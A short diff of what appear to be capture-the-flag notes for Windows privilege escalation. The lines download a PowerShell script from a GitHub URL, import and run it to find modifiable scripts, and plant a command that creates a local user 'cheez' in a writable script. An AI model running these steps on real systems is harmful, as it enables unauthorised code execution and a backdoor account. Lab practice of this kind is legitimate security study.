@@ -48,7 +48,8 @@ Get-WinEvent -FilterHashTable @{ LogName = "Microsoft-Windows-TaskScheduler/Oper
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/robertteir/CTF/master/TakeThis.ps1" -OutFile "TakeThis.ps1"
 
 #Search for ps1 scripts that can be modified
-.\TakeThis.ps1
+import-module .\TakeThis.ps1
+Get-ExecutedPSScripts (-all to list all executions)
 
 #Add to cheez.ps1
 New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String '****' -Force)
